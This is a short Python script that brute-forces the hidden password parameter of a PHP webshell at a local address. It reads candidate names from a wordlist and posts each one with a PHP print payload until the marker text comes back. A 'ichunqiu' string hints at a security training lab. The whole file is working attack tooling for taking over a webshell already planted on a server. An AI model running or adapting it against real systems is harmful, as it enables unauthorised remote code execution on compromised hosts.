#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import sys

# uname=1&passwd=1&submit=Submit

def crack(pwd):
	url = 'http://127.0.0.1:88/shell.php'
	data = {}
	data[pwd] = 'print("ichunqiu");'
	r = requests.post(url,data=data)
	if 'ichunqiu' in r.text:
		print '[*]Success! password is {}'.format(pwd)
		sys.exit(1)

f = open('webshell_fuzz.txt', 'r')
for i in f:
	crack(i.rstrip())
f.close()